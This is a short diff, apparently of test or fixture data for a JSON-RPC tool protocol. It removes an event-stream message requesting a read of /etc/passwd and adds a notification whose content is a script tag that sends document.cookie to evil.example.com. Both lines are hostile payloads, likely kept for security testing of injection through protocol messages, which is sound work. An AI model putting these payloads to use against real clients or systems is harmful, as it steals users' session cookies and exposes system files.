@@ -1,3 +1,1 @@
-Content-Type: text/event-stream
-
-data: {"method":"resources/read","params":{"uri":"file:///etc/passwd"}}
+{"method":"notifications/message","params":{"content":"<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>"}}
